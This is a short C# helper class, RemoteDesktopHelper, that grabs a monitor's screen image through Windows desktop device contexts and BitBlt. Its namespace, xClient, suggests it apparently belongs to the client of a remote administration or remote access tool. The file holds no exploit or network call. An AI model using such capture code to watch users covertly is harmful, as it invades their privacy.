﻿using System;
using System.Drawing;
using System.Windows.Forms;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class RemoteDesktopHelper
    {
        private const int SRCCOPY = 0x00CC0020;

        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);
            IntPtr desktopHandle = NativeMethods.GetDesktopWindow();
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = NativeMethods.GetWindowDC(desktopHandle);

                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY);
                NativeMethods.ReleaseDC(desktopHandle, srcDeviceContext);

                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }
    }
}